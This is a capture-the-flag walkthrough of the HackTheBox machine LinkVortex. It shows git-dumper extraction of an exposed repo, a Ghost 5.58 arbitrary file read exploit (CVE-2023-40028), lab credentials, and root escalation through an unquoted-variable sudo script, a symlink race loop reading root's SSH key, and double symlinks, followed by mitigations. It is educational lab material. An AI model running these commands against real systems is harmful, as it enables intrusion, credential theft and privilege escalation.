---
title: LinkVortex
date: 2025-06-22
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Linux, .git, git-dumper, Ghost-conf-file, arbitrary-file-read, unquoted-env-var, TOCTOU, double-symlinks] 
image: link.png
media_subpath: /assets/img/posts/2025-06-22-linkvortex/
---

## Introduction

In this walkthrough, I worked on an **easy Linux machine** from the HTB labs. I discovered a **subdomain** during enumeration and used `git-dumper` to extract the `.git` repository locally. Analyzing the repo revealed **credentials for a Ghost CMS instance**, which I used to log in. I then exploited an **arbitrary file read vulnerability** in Ghost to extract the application's config files, where I found valid **SSH credentials**. After gaining shell access, I identified **sudo privileges** for specific scripts. I escalated privileges to root by exploiting:

1. **Unquoted environment variables** in a root-executed script.
2. A **TOCTOU (Time-of-check to time-of-use)** race condition.
3. A **double symlink** vulnerability.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

<aside>
🚨

Run long gobuster scan

</aside>

## Services

### Port 22

## Web

### Port 80

Add domain to `/etc/hosts` .

```bash
**feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400**
```

![image.png](image%201.png)

- `/ghost/`
    
    ![image.png](image%202.png)
    
- `/email/`

Checking `Network` tab I see the `Ghost 5.58`.

![image.png](image%203.png)

**Vhost Fuzzing**

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -fs 230
```

![image.png](image%204.png)

```bash
gobuster dir -u http://dev.linkvortex.htb/ -w /usr/share/wordlists/dirb/common.txt -t 42 -b 400,403,404
```

![image.png](image%205.png)

## Exploitation

We are gonna use `git-dumper` to get `bare git repo`:

```bash
git-dumper http://dev.linkvortex.htb/ ./git_llot
```

```bash
git status
```

![image.png](image%206.png)

![image.png](image%207.png)

I found several passwords, and trying each one with `admin@linkvortex.htb` I found a hit with `OctopiFociPilfer45`:

![image.png](image%208.png)

I found the following exploit (Arbitrary File Read) for this version of application:

[Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

```bash
./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
```

![image.png](image%209.png)

I am gonna search for sensitive file location of `Ghost`.

Reading this [post](https://ghost.org/docs/config/#custom-configuration-files) and [this](https://github.com/docker-library/ghost/issues/73), I requested `/var/lib/ghost/config.production.json`.

```bash
/var/lib/ghost/config.production.json
```

![image.png](image%2010.png)

Using these credentials I could login with `ssh`.

## Privilege Escalation

Checking users I see:

```bash
cat /etc/passwd | grep sh$
```

![image.png](image%2011.png)

That means we don’t need to do lateral movement.

Checking sudo privileges I see:

![image.png](image%2012.png)

Checking content of file:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

1. **Environment variables**
    
    I see that some variable are not enclosed in quotes that means we can perform command injection, I am gonna give a command for `CHECK_CONTENT` and then run a script.
    
    ```bash
    export CHECK_CONTENT=/bin/bash
    ln -s /home/bob/user.txt file.png
    ```
    
    ![image.png](image%2013.png)
    
2. **TOCTOU (Time-of-Check to Time-of-Use)**
    
    We can also perform `TOCTOU` attack as `$LINK` after it has been checked is moved to another directory we can run continuous command where `$LINK` is changing every time, and when the original file is checked and put in directory our command will run and change that file again( we can do that because we have write access to the directory)
    
    ![image.png](image%2014.png)
    
    ![image.png](image%2015.png)
    
    ```bash
    while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/sshroot.png;done
    ```
    
    ![image.png](image%2016.png)
    
    ![image.png](image%2017.png)
    
3. **Double Symlinks**
    
    ```bash
     if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
        /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
        /usr/bin/unlink $LINK
      else
    ```
    
    Checking condition we see that check is not strict, we can use double symlink which does not contain `/etc/`, or `/root` in itself but still points to them.
    
    ![image.png](image%2018.png)
    
    Let’s make `$CHECK_CONTENT=true` so that it returns output.
    
    ![image.png](image%2019.png)
    

## Credentials

```bash
admin@linkvortex.htb:OctopiFociPilfer45
bob:fibber-talented-worth
```

## Mitigation

- Remove `.git` directories from publicly accessible paths or prevent access with `.htaccess` or server config.
- Secure sensitive configuration files using strict **file permissions**.
- Avoid using **hardcoded credentials** in applications or scripts.
- Sanitize and validate file access in applications to prevent **arbitrary file reads**.
- Use **quoted paths** in scripts, avoid using temporary files insecurely, and apply **secure coding** practices to prevent TOCTOU and symlink attacks.
- Regularly audit and restrict **sudoers entries** to minimize privilege escalation vectors.
